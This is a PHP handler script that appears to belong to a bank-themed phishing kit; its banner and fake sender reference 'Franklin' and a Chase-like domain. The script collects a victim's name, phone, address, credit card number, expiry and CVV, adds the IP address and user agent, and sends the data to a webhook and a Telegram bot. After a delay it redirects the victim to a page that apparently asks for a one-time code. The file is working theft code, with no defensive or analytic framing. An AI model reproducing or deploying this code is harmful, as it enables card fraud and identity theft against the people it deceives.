<?php
/*

 __,  ,_    _    ,  ,  ,  ,  ,    ___, ,  ,
'|_,  |_)  '|\   |\ |  |_/   |   ' |   |\ |
 |   '| \   |-\  |'\| '| \  '|__  _|_, |'\|
 '    '  `  '  ` '  `  '  `    ' '     '  `

*/
session_start();
$ip = getenv("REMOTE_ADDR");
$agnet = $_SERVER['HTTP_USER_AGENT'];
require '../main.php';
require '../config/settings.php';
// Copyright - Franklin.

If ($_POST['fullname'] == "") {
  echo "Sorry we blocked your request";
  exit;
}

If ($_POST['phone'] == "") {
  echo "Sorry we blocked your request";
    exit;

}

If ($_POST['address'] == "") {
  echo "Sorry we blocked your request";
    exit;

}

If ($_POST['city'] == "") {
  echo "Sorry we blocked your request";
    exit;

}

If ($_POST['zip'] == "") {
  echo "Sorry we blocked your request";
    exit;

}

If ($_POST['cc'] == "") {
  echo "Sorry we blocked your request";
    exit;

}

If ($_POST['exp'] == "") {
  echo "Sorry we blocked your request";
    exit;

}

If ($_POST['cvv'] == "") {
  echo "Sorry we blocked your request";
    exit;

}


$message .= "⭐------- Billing Information -------⭐\n";
$message .= "🧑 Full Name: " . $_POST['fullname'] . "\n";
$message .= "☎️ Phone Number: " . $_POST['phone'] . "\n";
$message .= "🏡 Address Line: " . $_POST['address'] . "\n";
$message .= "🌆 City/Town: " . $_POST['city'] . "\n";
$message .= "📮 Postal Code: " . $_POST['zip'] . "\n";
$message .= "⭐------- Card Information -------⭐\n";
$message .= "💳 Card Number: " . $_POST['cc'] . "\n";
$message .= "⌛ Expiry Date: " . $_POST['exp'] . "\n";
$message .= "🔒 CVV Code: " . $_POST['cvv'] . "\n";
$message .= "⭐------- Device Information -------⭐\n";
$message .= "🌐 IP Address: " . $ip . "\n";
$message .= "💻 OS/Browser: " . $os . "/" . $br . "\n";
$message .= "📅 Date: " . $date . "\n";
$message .= "🕵️ Agnet: " . $agnet . "\n";
$message .= "⭐------- To Be Continued -------⭐\n";
$headers = 'From: Franklin <franklin@chase.sell>' . "\r\n" .

$url = "" . $webhook . "";
$headers = ['Content-Type: application/json; charset=utf-8'];
$POST = ['username' => 'Quartz', 'content' => $message];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);

$apiUrl = "https://api.telegram.org/bot$http_api/sendMessage";
$params = ['chat_id' => $chat_id, 'text' => $message];
$queryString = http_build_query($params);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$apiUrl?$queryString");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);


// Sessions //
$_SESSION['fullname'] = $fullname = $_POST['fullname'];
$_SESSION['phone'] = $phone = $_POST['phone'];
$_SESSION['address'] = $address = $_POST['address'];
$_SESSION['city'] = $city = $_POST['city'];
$_SESSION['zip'] = $zip = $_POST['zip'];
$_SESSION['cc'] = $cc = $_POST['cc'];
$_SESSION['exp'] = $exp = $_POST['exp'];
$_SESSION['cvv'] = $cvv = $_POST['cvv'];

IF ($do_approve == "yes") {
  sleep(30);
  header('location: ../approval?session='.$key);
} else {
  sleep(30);
  header('location: ../onetime?session='.$key);

}

?>
